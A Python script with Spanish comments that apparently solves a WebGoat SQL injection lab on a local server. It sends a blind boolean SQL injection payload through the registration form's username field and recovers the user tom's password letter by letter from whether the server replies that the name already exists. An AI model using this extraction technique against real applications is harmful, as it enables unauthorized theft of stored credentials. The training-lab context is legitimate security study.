import requests


def blind_sqlI_5():
    COOKIE = 'JSESSIONID=Ow6xiaSDvQaMflyYCIC3YC1MAbv3LrKk0asppKdE'
    headers = {
        'Cookie': COOKIE,
    }

    # Verificar autenticación
    r = requests.get(
        'http://127.0.0.1:8080/WebGoat/start.mvc', headers=headers)
    if '<title>Login Page</title>' in r.text:
        print(
            "El JSESSIONID no es válido o la sesión ha caducado. Inicia sesión manualmente.")
        return

    # Variables necesarias para el ataque 
    alphabet_index = 0
    alphabet = 'abcdefghijklmnopqrstuvwxyz'
    password_index = 0
    password = ''

    while True:
        
        # Este payload envia una consulta al servidor que devolvera true o false si es true se almacena en password
        
        payload = f"tom' AND substring(password,{
            password_index + 1},1)='{alphabet[alphabet_index]}"
            
        # Datos que se enviaran en la solicitud
        
        data = {
            'username_reg': payload,
            'email_reg': 'ejercicio5@a',
            'password_reg': 'a',
            'confirm_password_reg': 'a'
        }

        # Tratamiento de la solicitud (put)    
        r = requests.put(
            'http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/challenge',
            headers=headers,
            data=data
        )

        # Depuración: Imprime encabezados de solicitud y respuesta
        print("Encabezados de la solicitud:", r.request.headers)
        print("Datos enviados:", data)

        # Verifica el código de estado
        if r.status_code != 200:
            print(f"Error en la solicitud: Código de estado {r.status_code}")
            print("Respuesta completa:", r.text)
            return

        # Verificacin del contenido de la respuesta
        if 'already exists please try to register with a different username' not in r.text:
            alphabet_index += 1
            if alphabet_index > len(alphabet) - 1:
                print("No se encontró el carácter actual. Finalizando...")
                return
        else:
            password += alphabet[alphabet_index]
            print(f"Contraseña encontrada hasta ahora: {password}")
            alphabet_index = 0
            password_index += 1


blind_sqlI_5()
